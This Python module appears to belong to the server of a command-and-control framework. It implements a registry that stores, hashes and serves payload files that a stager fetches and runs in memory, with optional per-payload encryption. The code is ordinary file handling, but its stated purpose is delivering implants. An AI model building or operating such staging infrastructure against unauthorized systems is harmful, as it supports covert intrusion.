"""Staged payload storage and delivery.

Payloads are full agents, pre-built and dropped into `payloads/` on
the server. The stager fetches them by name and executes them in
memory. Payloads are optionally AES-GCM encrypted with a per-payload
key that is embedded in the stager at build time.
"""

from __future__ import annotations

import hashlib
import json
import os
import threading
import time


class PayloadRegistry:

    def __init__(self, directory: str = 'payloads'):
        self.directory = directory
        self._lock = threading.Lock()
        self._cache = {}          # name -> {size, sha256, path, added}
        os.makedirs(self.directory, exist_ok=True)
        self._scan()

    def _scan(self):
        try:
            entries = sorted(os.listdir(self.directory))
        except OSError:
            return
        for entry in entries:
            if not entry.endswith('.bin'):
                continue
            name = entry[:-4]
            path = os.path.join(self.directory, entry)
            if not os.path.isfile(path):
                continue
            try:
                st = os.stat(path)
            except OSError:
                continue

            fingerprint = (
                st.st_mtime_ns,
                st.st_size,
                st.st_ino,
            )
            prev = self._cache.get(name)
            if (prev is not None
                    and prev.get('fingerprint') == fingerprint):
                # Unchanged since last scan.
                continue
            try:
                h = hashlib.sha256()
                with open(path, 'rb') as fh:
                    for block in iter(lambda: fh.read(1024 * 1024), b''):
                        h.update(block)
                self._cache[name] = {
                    'name':        name,
                    'path':        path,
                    'size':        st.st_size,
                    'sha256':      h.hexdigest(),
                    'added':       st.st_mtime,
                    'fingerprint': fingerprint,
                }
            except OSError:
                continue

    def list(self):
        with self._lock:
            self._scan()
            return list(self._cache.values())

    def get(self, name: str):
        with self._lock:
            self._scan()
            return self._cache.get(name)

    MAX_PAYLOAD_BYTES = 128 * 1024 * 1024

    def read(self, name: str) -> bytes:
        entry = self.get(name)
        if entry is None:
            return b''
        if entry.get('size', 0) > self.MAX_PAYLOAD_BYTES:
            return b''
        try:
            with open(entry['path'], 'rb') as fh:
                data = fh.read(self.MAX_PAYLOAD_BYTES + 1)
        except OSError:
            return b''
        if len(data) > self.MAX_PAYLOAD_BYTES:
            return b''

        got = hashlib.sha256(data).hexdigest()
        if got != entry['sha256']:
            with self._lock:
                self._scan()
            return b''
        return data